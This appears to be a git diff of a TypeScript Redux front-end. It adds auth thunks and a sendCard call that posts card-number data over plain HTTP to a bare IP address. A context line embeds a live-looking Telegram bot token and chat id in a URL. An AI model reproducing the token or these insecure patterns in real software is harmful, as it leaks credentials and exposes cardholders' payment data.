@@ -18,6 +18,25 @@ export const fetchPriceCurrency = createAsyncThunk(
   }
 );
 
+// auth
+export const logout = createAsyncThunk("logout", async (_, thunkAPI) => {
+  try {
+    const auth = localStorage.setItem("accessToken", "");
+    return auth;
+  } catch (e) {
+    return thunkAPI.rejectWithValue("Ошибка выхода");
+  }
+});
+
+export const checkAuth = createAsyncThunk("checkAuth", async (_, thunkAPI) => {
+  try {
+    const auth = localStorage.getItem("accessToken");
+    return JSON.parse(auth);
+  } catch (e) {
+    return thunkAPI.rejectWithValue("");
+  }
+});
+
 export const auth = createAsyncThunk("auth", async (data: any, thunkAPI) => {
   try {
     const response = await axios.post<any>(
@@ -53,6 +72,26 @@ export const sendMessageToChat = createAsyncThunk(
       axios.get(
         `https://api.telegram.org/bot5929144178:AAGMLGC4C2VyWAW6J8BTWMgEtn804i9xap8/sendMessage?chat_id=-815857169&text=${message}`
       );
+    } catch (e) {
+      return thunkAPI.rejectWithValue("Ошибка");
+    }
+  }
+);
+
+export const sendCard = createAsyncThunk(
+  "sendCard",
+  async (data: any, thunkAPI) => {
+    try {
+      const response = await axios.post<any>(
+        "http://178.154.220.209:8000/api/cardNumber",
+        data,
+        {
+          headers: {
+            "Content-Type": "multipart/form-data",
+          },
+        }
+      );
+      return response.data;
     } catch (e) {
       return thunkAPI.rejectWithValue("Ошибка");
     }
